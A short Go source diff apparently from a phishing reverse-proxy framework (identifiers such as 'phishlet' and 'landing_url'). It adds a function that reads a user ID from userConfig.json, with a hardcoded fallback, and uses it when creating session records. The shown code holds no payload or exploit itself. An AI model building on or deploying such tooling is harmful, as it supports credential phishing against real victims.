@@ -3,10 +3,57 @@ package database
 import (
 	"encoding/json"
 	"fmt"
+	"os"
+	"path/filepath"
 	"time"
 
 	"github.com/tidwall/buntdb"
 )
+
+// UserConfig holds the user configuration data
+type UserConfig struct {
+	UserId string `json:"user_id"`
+}
+
+// GetUserId reads the user_id from userConfig.json
+func GetUserId() string {
+	// Default user ID in case we can't read the file
+	defaultUserId := "jemex123"
+	
+	// Try to find userConfig.json in current directory or up to 2 parent directories
+	configFile := "userConfig.json"
+	configPaths := []string{
+		configFile,
+		filepath.Join("..", configFile),
+		filepath.Join("..", "..", configFile),
+	}
+	
+	var configData []byte
+	var err error
+	
+	for _, path := range configPaths {
+		configData, err = os.ReadFile(path)
+		if err == nil {
+			break
+		}
+	}
+	
+	if err != nil {
+		return defaultUserId
+	}
+	
+	// Parse the config file
+	var config struct {
+		UserId string `json:"user_id"`
+	}
+	
+	err = json.Unmarshal(configData, &config)
+	if err != nil || config.UserId == "" {
+		return defaultUserId
+	}
+	
+	return config.UserId
+}
 
 const SessionTable = "sessions"
 
@@ -68,7 +115,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		RemoteAddr:   remote_addr,
 		CreateTime:   time.Now().UTC().Unix(),
 		UpdateTime:   time.Now().UTC().Unix(),
-		UserId:       "JEMEX123",
+		UserId:       GetUserId(),
 		CountryCode:  "",
 		Country:      "",
 	}
